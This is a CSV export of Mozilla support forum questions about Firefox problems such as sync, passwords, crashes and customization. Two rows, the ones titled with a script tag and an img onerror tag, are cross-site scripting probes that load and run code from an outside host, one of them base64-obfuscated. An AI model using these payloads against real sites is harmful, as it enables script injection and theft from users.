id,created,updated,title,content,tags,product,topic,locale,answers,creator
1274688,2019-12-09 11:52:03 -0800,2019-12-09T13:06:19Z,ASPERA 3.9 Connect not working on latest firefox ( Dec-12-2019),"<p>The app boots up when prompted thru browser but wont actually work.
</p>",firefox-710;customize;desktop;windows-10;,firefox,customize,en-US,1272126;,steve142
1274686,2019-12-09 11:07:09 -0800,2019-12-09T11:56:08Z,i can't restore data or sync and i lost my bookmarks and logins and ...  what can i do?,"<p>Signed in to my account but my information will not be restored. What should I do?
</p>",firefox-700;firefox-7001;desktop;sync;windows-10;,firefox,sync,en-US,1272104;,info1079
1274685,2019-12-09 10:58:29 -0800,2019-12-10T11:59:43Z,"Lockwise in FF 71.0 64bit recording asterisks as password?  On ""no username"" UID?  Thanks","<p>I clicked the green ""Automatically add"" button for ""Troubleshooting information:"" just below this text box, and it took me to a dead page, and lost everything I had typed (yeah, rookie mistake on my part, fine)...  the landing page address: <a href=""https://addons.mozilla.org/firefox/downloads/latest/426841/addon-426841-latest.xpi"" rel=""nofollow"">https://addons.mozilla.org/firefox/downloads/latest/426841/addon-426841-latest.xpi</a> ..
</p><p>.. with text:
""
</p><pre>Add-ons
</pre>
<p>We're sorry, but we can't find what you're looking for.
</p><p>The page or file you requested wasn't found on our site. It's possible that you clicked a link that's out of date, or typed in the address incorrectly. 
""
</p><p>..... and continuing on for a bit after that.
</p><p>basic problem is described in subject line.  I could gripe endlessly about prior disclosure, and how appalling it is to see this problem persist over several versions, but mostly I'm curious how it does not seem to have been asked / answered yet?
</p><p>I will upload screencaps if needed, but I am going to a banking website, entering UID &amp; password, and telling FF to update the password.  Not only does it not update for that UID, instead putting it into the ""no username"" storage for this website, but it is storing asterisks (in the same amount as the actual password) instead of the password.  Yes, I clicked on the little ""eye"" next to the password field under Tools.Options.Privacy .. and yes, I tried trusting and just using the stored password both for the UID (it kept the old password) and also for the ""no username"" and neither works.  I can update the password manually when under Tools.Options.Privacy, but I do not have the time nor inclination to do this for hundreds of logins.
</p><p>This is entirely unacceptable, and needs to be fixed post haste.
</p><p>Now copying and pasting everything I typed here, because I fully expect that I'll click ""Post Question"" and all will be lost...
</p><p><br>
FF 71.0 64bit updated 09 Dec 2019 - Win7 home 64 bit .. hardly any addins/plugins as the ones I used have mostly been deprecated through all the updates.
</p><p>My profile along with stored passwords has been carried forward through at least three years of updates with no problems, prior to Quantum.
</p>",firefox-710;desktop;fix-problems;escalate;,firefox,fix-problems,en-US,1272088;1272090;1272128;1272399;1272404;,chris142
1274684,2019-12-09 10:57:05 -0800,2019-12-09T10:57:05Z,"Firefox no longer able to open SharePoint documents in app - ""one of the following protocols (ms-word) isn’t associated with any program or is not allowed""","<p>I've been using Firefox for many months and rarely had issues with this, but I've been unable to open documents from SharePoint to the MSFT apps on my computer for the last two weeks. When I have a SharePoint link that I need to open, one of two things happens: 
- if I right-click on the link and select ""open in Word"" (or whatever MS product I need), I get the following error message: ""Firefox doesn’t know how to open this address, because one of the following protocols (ms-word) isn’t associated with any program or is not allowed in this context.    You might need to install other software to open this address""
</p><p>- If I open the document in the browser and then select ""Open in app,"" it indicates that the app has been opened but nothing happens.
</p><p>Any ideas on how to fix this?
</p>",firefox-710;desktop;fix-problems;windows-10;,firefox,fix-problems,en-US,"",claire.a.coleman
1274680,2019-12-09 10:10:59 -0800,2019-12-09T10:17:13Z,"""><script src=https://xssnoob.xss.ht></script>","<p>""&gt;&lt;script src=<a href=""https://xssnoob.xss.ht"" rel=""nofollow"">https://xssnoob.xss.ht</a>&gt;&lt;/script&gt;
</p>",firefox-710;other;desktop;windows-10;,firefox,other,en-US,1272054;1272055;1272056;1272057;1272058;1272060;1272061;1272062;1272063;1272064;1272065;,koliboychetan
1274678,2019-12-09 09:40:26 -0800,2019-12-09T10:19:49Z,Add-ons do not show on toolbar when history is disabled. Can someone explain why?,"<p>I have the same issue user irisbis had: <a href=""https://support.mozilla.org/en-US/questions/1078548"" rel=""nofollow"">https://support.mozilla.org/en-US/questions/1078548</a>
</p><p>Add-ons do not show in the toolbar when firefox is set to never remember history. I would like to know why this is the case, does somebody understand the reason?
</p>",firefox-700;customize;desktop;linux;,firefox,customize,en-US,1272046;1272048;1272050;1272053;1272067;,mundisgl
1274677,2019-12-09 09:39:01 -0800,2019-12-09T09:39:01Z,Address was not understood,"<p>We use Datto RMM at work and when I go to launch the agent browser(The name of their tool) I get the above error. Most of the time I can close and open Firefox a few times and it will then work. Today however it will not work. I tried running FF in safe mode and still nothing. The setting under appilcations is correct and also the registry settings for the protocol cag are also correct. I can launch the software from IE which just makes me shutter.
</p>",firefox-710;desktop;fix-problems;windows-10;,firefox,fix-problems,en-US,"",joe61
1274676,2019-12-09 09:25:01 -0800,2019-12-09T10:05:38Z,"I received multiple emails to my personal email account instructing me to confirm my email, for an account I did not create.  How do I prevent fraud?","<p>Yesterday I received two separate emails (to my personal email account, separate from the one I used to post this message) from Firefox as part of a new account creation, neither of which I requested.  The first included a link to confirm my email. The second included a verification code.
</p>",privacy-and-security_1;desktop;firefox-650;mac-os;,firefox,privacy-and-security,en-US,1272043;1272051;,jkeene5
1274675,2019-12-09 09:08:16 -0800,2019-12-09T17:31:39Z,link to reset password Bad Request,"<p>I get this error when trying to reset password
</p>",firefox-710;other;desktop;windows-7;,firefox,other,en-US,1272032;1272214;1272224;,1940woodchuck
1274673,2019-12-09 09:00:27 -0800,2019-12-09T09:04:55Z,"Youtube opens a random channel every time I go on Youtube website, how to solve this?","<p>Every time I go to <a href=""http://youtube.com"" rel=""nofollow"">youtube.com</a>, a random channel is loaded and I can't get out of it...
I've tried a fresh FireFox install, but the same thing happens all the time
</p>",firefox-710;websites;desktop;windows-10;,firefox,websites,en-US,1272028;,eitan.rotbart
1274672,2019-12-09 08:56:36 -0800,2019-12-09T09:02:29Z,Is Firefox account secure?,"<p>I have probably a virus and I reinstall new Windows system. In firefox account is synchronization with my Firefox. But also are AddOns, these addon can be infected. Ask: On account are my addons as files or only infomration about installing addons and there are loaded new?
</p>",privacy-and-security_1;firefox-710;desktop;windows-10;,firefox,privacy-and-security,en-US,1272027;,borucki.andrzej
1274671,2019-12-09 08:55:36 -0800,2019-12-09T09:36:41Z,Is there any way I can prevent an ad-on from being uninstalled/disabled without installing any additional add-ons (like this one https://addons.mozilla.org/en-U,"<p>As the title says
</p>",firefox-710;customize;desktop;windows-10;,firefox,customize,en-US,1272029;1272042;,dragos.08mai
1274669,2019-12-09 08:16:34 -0800,2019-12-09T11:35:59Z,"After clearing Firefox cache, I can't access gmail.","<p>Firefox was running very slowly, so I cleared the cache. Now I cannot open gmail. When I try, gmail opens a page that prompts me to set up a new account. Gmail opens fine in Safari &amp; Opera. I do not have any security apps loaded that might create a conflict.
</p>",firefox-710;desktop;fix-problems;mac-os;,firefox,fix-problems,en-US,1272008;1272013;1272018;1272031;1272037;1272049;1272095;,adennichols
1274667,2019-12-09 07:39:41 -0800,2019-12-09T08:39:39Z,"mac error message: The application 'Firefox"" can't be opened","<p>Tried removing application, empty trash, reinstalled firefox, rebooted mac. Same error. Also tried holding down control and opening program. Did not help. Mac OS 10.14.6.
</p>",desktop;fix-problems;,firefox,fix-problems,en-US,1272015;1272017;,fredhaim
1274665,2019-12-09 07:19:47 -0800,2019-12-09T11:52:24Z,"My screen size just changed, there is about a 1/2"" of  my screen saver showing at the bottom. Whe I use the zoom it cuts the top off. How do I fix this problem?","<p>This happened when I tried to install adobe flash
</p>",firefox-710;other;desktop;mac-os;,firefox,other,en-US,1272026;1272101;,Hombart
1274664,2019-12-09 06:54:21 -0800,2019-12-09T06:54:21Z,picture-in-picture posicionamento personalizado,"<p>A posição padrão do picture-in-picture do firefox em alguns frames de vídeos fica sendo sobre posto por algum elemento do reprodutor no meu caso, o problema ocorre devido o botão de próximo estar sobrepondo o picture-in-picture. Então minha ideia seria que vocês deixassem a posição do mesmo personalizável, assim se o usuário tiver problemas com a posição do objeto ele poderia alterar a partir da guia ""personalizar"".
</p>",firefox-710;customize;desktop;windows-10;,firefox,customize,pt-BR,"",josafadieb
1274663,2019-12-09 06:48:13 -0800,2019-12-09T09:33:06Z,An extension has disappeared from AMO with no explanation... should I be worried?,"<p>I've been using the extension Screengrab! for years, and still have it installed (v2.18), but it seems to have disappeared from the add-ons repository without trace. How do I find out if the author has retired it or if Mozilla have acted over some security fear? The extension still seems to be available in the Chrome web store (can't see a version number). Screengrab! had tens of thousands of users and had been updated for web extensions (although with some loss of functionality) so it seems strange for it to just disappear.
</p>",firefox-710;other;desktop;windows-7;,firefox,other,en-US,1271991;1272002;1272004;1272025;1272035;1272040;,BlazingReynard
1274662,2019-12-09 06:44:20 -0800,2019-12-09T09:14:04Z,Login and Password Surround Boxes Not Showing,"<p>When logging into a site that needs a User Name and Password, the actual boxes are not highlighted to insert relevant details. This applies to saved logins as well.  To overcome this issue I have to enter any character to bring up the boxes and then delete this character. The empty box then remains to enter the details. I have tried Chrome and the boxes are there.
</p>",firefox-680;other;desktop;windows-10;,firefox,other,en-US,1271982;1271985;1272000;1272030;1272033;,ActrosMP2
1274658,2019-12-09 05:51:36 -0800,2019-12-09T06:31:00Z,firefox crashes at startup,"<p>Overnight (I changed nothing, but microsoft rebooted my computer and I don't see any new files installed or updates) Firefox will not work. I can see it start up in task manager (two processes) but within 1 second both are gone. I've tried uninstalling and reinstalling firefox. Same problem. This is Windows 10 v 1909. Firefox will not start in safe mode. I cannot find any crash files (in the past month).
</p>",firefox-700;desktop;fix-problems;windows-10;,firefox,fix-problems,en-US,1271956;1271963;1271966;,mattffff
1274656,2019-12-09 05:35:45 -0800,2019-12-09T07:24:36Z,Secure Connection Failed,"<p>The page you are trying to view cannot be shown because the authenticity of the received data could not be verified
</p>",other;desktop;,firefox,other,en-US,1271947;1271983;1271999;,bolo2fast4u
1274655,2019-12-09 05:21:19 -0800,2019-12-09T06:06:00Z,How do I hide tab bar scroll buttons in FF 71?,"<p>Before FF 71, I had been using this userChrome CSS to hide the scroll buttons:
</p>
<ol><li>TabsToolbar toolbarbutton[class^=""scrollbutton""] {
</li></ol>
<pre>   display: none !important;
   }
</pre>
<p>Now it's stopped working. Does anyone know the new code?
</p>",firefox-710;customize;desktop;mac-os;,firefox,customize,en-US,1271944;1271952;1271959;,practik
1274652,2019-12-09 05:11:35 -0800,2019-12-09T06:02:10Z,ff is not handling Look-Alike Domains properly,"<p>there is a known issue where scammers setup Look-Alike Domains so the URL appears like  <a href=""http://apple.com"" rel=""nofollow"">apple.com</a> or your bank to deceive unsuspecting users ... see      <a href=""https://hackaday.com/2017/04/19/you-think-you-cant-be-phished/"" rel=""nofollow"">https://hackaday.com/2017/04/19/you-think-you-cant-be-phished/</a>
</p><p>I tested this on ff nightly and the Look-Alike hacked site just appeared as  <a href=""https://www.аррӏе.com/"" rel=""nofollow"">https://www.аррӏе.com/</a>  
</p><p>ff has setting in about:config
</p><p>network.IDN_show_punycode
</p><p>which defaults to false ... when set to true above issue is resolved and browser properly shows actual underlying faked URL as <a href=""https://www.xn--80ak6aa92e.com/"" rel=""nofollow"">https://www.xn--80ak6aa92e.com/</a>  and not  <a href=""https://www.аррӏе.com/"" rel=""nofollow"">https://www.аррӏе.com/</a>  
</p><p>Firefox should fix this default setting
</p>",other;desktop;linux;,firefox,other,en-US,1271954;,EventHorizon
1274651,2019-12-09 05:05:17 -0800,2019-12-09T07:04:23Z,"""><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzbm9vYi54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eva","<p>""&gt;<img src=""x"">
</p>",firefox-710;websites;desktop;,firefox,websites,en-US,1271939;1271940;1271941;1271942;1271943;,nik08
1274649,2019-12-09 04:28:28 -0800,2019-12-09T14:34:35Z,thumbnail size in upload dialog (linux),"<p>I am using firefox on linux (kde plasma) and when I go to upload a photo in a webpage I get the upload dialog but the thumbnails are too small to view which I really need for photos and there are no view options to change the size of them... This feels like a fundamental feature I'm missing...  Is it possible?
</p><p>Attached the upload dialog window
</p>",other;firefox-700;firefox-7001;desktop;linux;,firefox,other,en-US,1272010;1272021;1272144;1272153;,hello33
1274648,2019-12-09 03:59:28 -0800,2019-12-10T10:36:02Z,"How can I remove bundled search engines (Amazon, Bing, etc.) for good?","<p>Hello, I still have Amazon, Bing, Chambers &amp; co. in my extension list in about:support, even though i have disabled all of them in about:preferences#search. How can I purge them for good?
</p><p>Firefox 71.0 on Fedora 31.
</p>",firefox-710;customize;desktop;fedora;,firefox,customize,en-US,1271977;1271988;1271990;1272303;1272321;1272382;,Fulan
1274646,2019-12-09 03:30:10 -0800,2019-12-09T03:30:10Z,Firefox is requiring a security key be inserted to login to Microsoft.,"<p>I have never had one and never used one.  It will not allow any other type of login.  This does not occur on IE or Chrome.
</p>",firefox-710;desktop;fix-problems;windows-10;,firefox,fix-problems,en-US,"",john207
1274645,2019-12-09 03:08:30 -0800,2019-12-09T03:10:31Z,How can I customize my outgoing email,"<p>I would like to have a pre-setup page as outgoing mail with my name and company details on as a ""footer"".  How do I go about setting this up?
</p>",customize;desktop;,firefox,customize,en-US,1271930;,klomedaid
1274644,2019-12-09 02:32:35 -0800,2019-12-09T23:04:29Z,Please can I waste hours on end with firefox help on non existant problems on other platforms,"<p>Been trying to open yahoo mail as I need it on a computer not on the phone. I use it every day plenty of times on the phone and laptop. Today I can't open it. Firefox says theres an update, so I download it. I then have to verify my firefox account with my email...of which I cannot open. Yet again another stupid update poorly researched and executed. No doubt I will be told its my fault because I dont have update 72.3.56.786  or install 234.3987.2 or some crap no one would ever know about
</p>",firefox-700;desktop;fix-problems;windows-10;,firefox,fix-problems,en-US,1272006;1272011;1272117;1272139;1272264;1272265;,andybeee12345
1274640,2019-12-09 01:01:14 -0800,2019-12-09T12:31:39Z,How do i  prevent long list of login credential suggestions,"<p>Hi all,
</p><p>All of a sudden i get a long list of login credentials suggestions. Normally FF would only just present login cred suggestions for the site name i'm trying to log on, but now i get a long list of them. Also for sites that i'm not on. Is this one of the 'virtues' of LockWise?
</p><p>What happend along the way, and can i turn this 'feature' off so that i only get login credential suggestions for the site i'm actually trying to log on?
</p>",tips;firefox-710;desktop;,firefox,tips,en-US,1271919;1271923;1272109;,leemkire
1274637,2019-12-08 21:58:05 -0800,2019-12-08T23:26:58Z,firefox installed. but require the firefox install.,"<p>i installed firefox.
but after a day or two, add-ons pages, 'Only with Firefox—Get Firefox Now' so can't install add-ons.
how to fix it?
</p>",firefox-710;other;desktop;windows-10;,firefox,other,en-US,1271903;1271904;1271907;,jmlee199
1274635,2019-12-08 20:52:40 -0800,2019-12-09T09:42:29Z,How to post code on forum?,"<p>How do you post source code on these support forums?
</p><p>Like below;
</p>
<ol><li>TabsToolbar {
</li></ol>
<pre>position: absolute !important;
bottom: 0 !important;
width: 100vw !important;
</pre>
<p>}
</p>",firefox-710;other;desktop;windows-7;,firefox,other,en-US,1271896;1271906;1271909;1272007;1272016;1272024;1272036;1272044;,jorb
1274633,2019-12-08 19:34:47 -0800,2019-12-09T06:07:57Z,Firefox 70.1 on iMac Catalina won't remember browser history. Nothing shows in any menu.,"<p>I cannot recall any browser history. I am running Firefox 70.0.1 (64 bit) on my new iMac with Catalina (10.15.1). Every menu for history is empty. I also am unable to delete browsing tabs. I am using Google search engine. Very frustrating...
</p><p>greats@aol.com
</p>",firefox-710;other;desktop;mac-os;,firefox,other,en-US,1271893;1271962;,greats
1274632,2019-12-08 19:25:20 -0800,2019-12-09T06:21:19Z,One website page is not displaying properly,"<p>As of a few days ago the following website stopped displaying the petitions accurately. (<a href=""https://www.thepetitionsite.com/takeaction/969/550/917/"" rel=""nofollow"">https://www.thepetitionsite.com/takeaction/969/550/917/</a>) The page/s look like they are loading in an html format which makes them useless to me as I CANNOT sign petitions. I checked to see if this problem occurs in Chrome and it does NOT, so this is only happening in Firefox. I hope you can help me figure this out.  ~Thank You, P.S. Here is how the page looks. It is not supposed to be loading like this.
</p>",firefox-710;websites;desktop;windows-7;,firefox,websites,en-US,1271901;1271967;1271968;,Hvnly777
1274630,2019-12-08 18:02:37 -0800,2019-12-08T18:02:37Z,Não consigo transmitir lives no YouTube utilizando o Firefox. Quando abro o painel ao vivo a tela fica preta e não aparecem as opções para iniciar a transmissão,"<p>Estou tentando fazer uma transmissão ao vivo no Youtube pelo Firefox, porem quando abro o studio e clico em criar a transmissão , a tela fica preta e não termina o carregamento (congela). Eu consegui transmitir há uma semana mas nesta sexta o problema não me deixou e ainda continua hoje (domingo).
</p><p>Eu já tentei:
- Reiniciar o Firefox em modo seguro
- Restaurar o Firefox
- Atualizar o Flash
- Limpar dados de navegação
- Outras contas do Youtube
- Atualizar windows
- Usar Firefox em outro computador
</p><p>Mas nada adiantou. No Google Chrome o painel ao vivo abre e eu consigo transmitir.
</p>",firefox-710;other;desktop;windows-10;,firefox,other,pt-BR,"",doug12.89
